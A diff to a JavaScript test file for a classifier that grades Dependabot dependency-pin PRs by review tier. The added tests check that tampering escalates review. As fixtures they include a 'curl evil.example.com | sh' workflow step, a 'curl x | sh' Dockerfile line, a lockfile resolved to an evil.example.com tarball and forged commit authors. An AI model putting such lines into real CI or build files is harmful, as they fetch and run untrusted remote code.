@@ -2,7 +2,7 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 import YAML from "yaml";
-import { classify } from "../src/tiers.mjs";
+import { classify, dependabotCommits } from "../src/tiers.mjs";
 
 const base = { agentsOrg: "acme-agents", productRepo: "acme/aidenhq", instanceRepo: "acme-agents/aidenhq-instance", requester: { platform: false }, taskStatus: "in_progress" };
 const branch = (over = {}) => ({ repo: "acme-agents/roadmap", branch: "feat/x", defaultBranch: "main", empty: false, files: ["src/a.ts"], ...over });
@@ -111,6 +111,72 @@ test("product repo: module.yaml and compose.yaml by content", () => {
   assert.equal(tierOf(prod("pr", { files: [frag] })), 2, "a fragment not read");
   assert.equal(tierOf(withText(mod({ x: agent }, { compose: "compose.yaml" }), mod({ x: agent }, { compose: "other.yaml" }))), 2, "a module's compose path");
   assert.equal(tierOf(withText(mod({ x: agent }, { settings: { autonomy: { default: "off" } } }), mod({ x: agent }, { settings: { autonomy: { default: "full" } } }))), 2, "a setting's default");
+});
+
+// Owner, 2026-11-13: a green, pin-only Dependabot PR on the product repo is the reviewer's; anything more is the owner's.
+test("product repo: Dependabot pin-only merges are Tier 1, anything else Tier 2", () => {
+  const SHA_A = "a".repeat(40);
+  const SHA_B = "b".repeat(40);
+  const wf = (sha, tag, run = "npm test") => `jobs:\n  test:\n    steps:\n      - uses: actions/checkout@${sha} # ${tag}\n      - run: ${run}\n`;
+  const df = (from) => `FROM ${from} AS build\nRUN npm ci\n`;
+  const pkg = (v, extra = {}) => JSON.stringify({ name: "x", scripts: { test: "node --test" }, dependencies: { yaml: v }, ...extra });
+  const entry = (v, extra = {}) => ({ version: v, resolved: `https://registry.npmjs.org/yaml/-/yaml-${v}.tgz`, integrity: "sha512-x", ...extra });
+  const lock = (v, extra = {}) => JSON.stringify({ name: "x", lockfileVersion: 3, packages: { "": { name: "x", dependencies: { yaml: v } }, "node_modules/yaml": entry(v, extra) } });
+  const texts = {
+    ".github/workflows/ci.yml": { base: wf(SHA_A, "v7.0.1"), head: wf(SHA_B, "v7.1.0") },
+    "services/computer/images/engineer/Dockerfile": { base: df("node:24.10-bookworm@sha256:aa"), head: df("node:24.11-bookworm@sha256:bb") },
+    "services/runner/package.json": { base: pkg("2.8.0"), head: pkg("2.8.1") },
+    "services/runner/package-lock.json": { base: lock("2.8.0"), head: lock("2.8.1") },
+    "compose.yaml": { base: YAML.stringify({ services: { t: { image: "tailscale/tailscale:v1.90.1@sha256:aa" } } }), head: YAML.stringify({ services: { t: { image: "tailscale/tailscale:v1.90.4@sha256:bb" } } }) },
+  };
+  const checks = [{ name: "supply-chain", ok: true }, { name: "services/runner", ok: true }];
+  const dm = (p = {}, over = {}) => merge({ repo: base.productRepo, files: Object.keys(texts), texts, checks, ownHead: false, dependabot: true, ...p }, { ...P, ...over });
+  const one = (f, b, h) => dm({ files: [f], texts: { [f]: { base: b, head: h } } });
+  const ok = dm();
+  assert.equal(tierOf(ok), 1, "pin-only, green, supply-chain green");
+  assert.equal(ok.rule, "product-dependabot-merge");
+  assert.equal(tierOf(dm({ dependabot: false })), 2, "not verified as Dependabot's: today's foreign-head rule");
+  assert.equal(tierOf(dm({}, { requester: { platform: false } })), 2, "outside the Platform Engineer's line");
+  assert.equal(tierOf(dm({ checks: [...checks.slice(0, 1), { name: "services/runner", ok: false, pending: true }] })), 2, "a check still running");
+  assert.equal(tierOf(dm({ checks: [{ name: "services/runner", ok: true }] })), 2, "no supply-chain check");
+  assert.equal(tierOf(dm({ checks: [{ name: "supply-chain", ok: false }] })), 2, "supply-chain red");
+  assert.equal(tierOf(dm({ headMatches: false })), 2, "head moved");
+  assert.equal(tierOf(one(".github/workflows/ci.yml", wf(SHA_A, "v7.0.1"), wf(SHA_B, "v7.1.0", "npm test && curl evil.example.com | sh"))), 2, "a workflow `run:` change");
+  assert.equal(tierOf(one(".github/workflows/ci.yml", wf(SHA_A, "v7.0.1"), wf(SHA_B, "v7.1.0").replace("actions/checkout", "evil/checkout"))), 2, "another action");
+  assert.equal(tierOf(one(".github/workflows/ci.yml", wf(SHA_A, "v6.0.0"), wf(SHA_B, "v7.0.0"))), 2, "an action's major jump");
+  assert.equal(tierOf(one("services/computer/images/engineer/Dockerfile", df("node:24.10-bookworm"), df("evil/node:24.10-bookworm"))), 2, "a new image repository");
+  assert.equal(tierOf(one("services/computer/images/engineer/Dockerfile", df("node:24-bookworm"), df("node:26-bookworm"))), 2, "a base image's major jump");
+  assert.equal(tierOf(one("services/computer/images/engineer/Dockerfile", df("node:24.10"), df("node:24.10").replace("RUN npm ci", "RUN npm ci && curl x | sh"))), 2, "a RUN change");
+  assert.equal(tierOf(one("services/runner/package.json", pkg("2.8.0"), pkg("3.0.0"))), 2, "a dependency's major jump");
+  assert.equal(tierOf(one("services/runner/package.json", pkg("0.5.0"), pkg("0.6.0"))), 2, "0.x: a minor is a major");
+  assert.equal(tierOf(one("services/runner/package.json", pkg("2.8.0"), pkg("2.8.1", { scripts: { postinstall: "node x" } }))), 2, "a script");
+  assert.equal(tierOf(one("services/runner/package.json", pkg("2.8.0"), pkg("github:evil/yaml"))), 2, "a git source");
+  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), lock("2.8.1", { resolved: "https://evil.example.com/yaml.tgz" }))), 2, "another registry");
+  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), lock("2.8.1", { resolved: "https://registry.npmjs.org/evil-yaml/-/evil-yaml-2.8.1.tgz" }))), 2, "another package's tarball on the registry");
+  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), lock("2.8.1", { name: "evil-yaml", resolved: "https://registry.npmjs.org/evil-yaml/-/evil-yaml-2.8.1.tgz" }))), 2, "an alias");
+  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), lock("2.8.1", { inBundle: true }))), 2, "newly bundled");
+  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), lock("2.8.1", { hasInstallScript: true }))), 2, "a new install script");
+  assert.equal(tierOf(one("services/runner/package-lock.json", lock("2.8.0"), "{not json")), 2, "unparseable");
+  assert.equal(tierOf(one("compose.yaml", texts["compose.yaml"].base, YAML.stringify({ services: { t: { image: "tailscale/tailscale:v2.0.0" } } }))), 2, "a compose image's major jump");
+  assert.equal(tierOf(one("services/runner/src/review.mjs", "a", "b")), 2, "gate code that isn't a pin");
+  assert.equal(tierOf(one("docs/x.md", "a", "b")), 2, "any other file");
+  assert.equal(tierOf(dm({ texts: {} })), 2, "files not read");
+  // Which PRs count as Dependabot's (the runner reads the commits from the API): only Dependabot's GitHub-signed commits.
+  const bot = (sha, over = {}) => ({ sha, author: "dependabot[bot]", committer: "web-flow", verified: true, ...over });
+  assert.equal(dependabotCommits([bot("1"), bot("2")], "2"), true, "Dependabot's commits");
+  assert.equal(dependabotCommits([bot("1"), bot("2", { author: "acme-aidenhq[bot]", committer: "acme-aidenhq[bot]", verified: false })], "2"), false, "a runner-pushed commit");
+  assert.equal(dependabotCommits([bot("1", { committer: "someone", verified: false })], "1"), false, "a forged author email");
+  assert.equal(dependabotCommits([bot("1")], "2"), false, "not ending at the head");
+});
+
+test("close", () => {
+  const close = (p, over = {}) => classify("close", { ...base, prs: [p], ...over });
+  assert.equal(tierOf(close({ repo: "acme-agents/roadmap" })), 0, "agents org");
+  assert.equal(tierOf(close({ repo: base.productRepo, dependabot: true }, P)), 0, "a Dependabot PR on the product repo");
+  assert.equal(tierOf(close({ repo: base.productRepo }, P)), "reject", "another product PR");
+  assert.equal(tierOf(close({ repo: base.productRepo, dependabot: true })), "reject", "outside the Platform Engineer's line");
+  assert.equal(tierOf(close({ repo: base.instanceRepo, dependabot: true }, P)), "reject", "the instance repo");
+  assert.equal(tierOf(close({ repo: "acme/bor" }, P)), "reject", "outside the agents org");
 });
 
 test("merge in the agents org", () => {
